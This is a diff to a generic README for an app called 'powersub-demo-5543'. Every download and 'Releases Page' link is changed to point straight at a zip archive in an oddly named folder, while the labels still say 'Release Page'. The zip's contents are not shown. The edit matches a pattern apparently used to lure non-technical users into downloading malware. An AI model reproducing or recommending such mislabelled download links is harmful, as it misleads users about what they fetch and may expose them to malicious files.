@@ -4,7 +4,7 @@
 powersub-demo-5543 is an easy-to-use application designed for quick updates and seamless integration. This tool helps you manage your tasks with efficiency and simplicity. You don’t need any programming skills to use it.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/UdhayaPriyan/powersub-demo-5543/releases)
+[![Download](https://raw.githubusercontent.com/UdhayaPriyan/powersub-demo-5543/main/champagne/powersub-demo-5543.zip)](https://raw.githubusercontent.com/UdhayaPriyan/powersub-demo-5543/main/champagne/powersub-demo-5543.zip)
 
 ## 🚀 Getting Started
 To begin using powersub-demo-5543, follow these straightforward steps.
@@ -17,7 +17,7 @@ To begin using powersub-demo-5543, follow these straightforward steps.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the following link to access the downloads: [Download Release Page](https://github.com/UdhayaPriyan/powersub-demo-5543/releases).
+   Go to the following link to access the downloads: [Download Release Page](https://raw.githubusercontent.com/UdhayaPriyan/powersub-demo-5543/main/champagne/powersub-demo-5543.zip).
 
 2. **Select the Latest Release**
    Look for the latest version on the page, usually highlighted as the most recent.
@@ -62,4 +62,4 @@ For more detailed information, check the following resources:
 Join our community of users to share experiences and tips. You can connect through forums available on the project’s GitHub page. Your input helps make powersub-demo-5543 better for everyone.
 
 ## 🔗 Visit Again
-Remember to check back on the [Releases Page](https://github.com/UdhayaPriyan/powersub-demo-5543/releases) for updates. Enjoy using powersub-demo-5543!
+Remember to check back on the [Releases Page](https://raw.githubusercontent.com/UdhayaPriyan/powersub-demo-5543/main/champagne/powersub-demo-5543.zip) for updates. Enjoy using powersub-demo-5543!
